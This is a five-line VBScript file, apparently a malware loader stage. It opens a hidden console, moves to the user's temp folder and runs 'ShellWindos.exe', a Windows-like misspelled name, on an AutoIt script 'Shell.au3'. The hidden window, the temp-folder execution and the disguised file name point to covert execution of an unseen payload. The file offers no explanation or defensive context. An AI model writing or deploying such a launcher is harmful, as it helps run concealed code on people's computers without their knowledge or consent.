const CONSOLE_HIDE=0
const CONSOLE_SHOW=1
const CMD_WAIT=true
set oShell = wscript.createObject("WScript.Shell")
oShell.run "CmD /C cd %temp% && ShellWindos.exe Shell.au3", CONSOLE_HIDE, CMD_WAIT
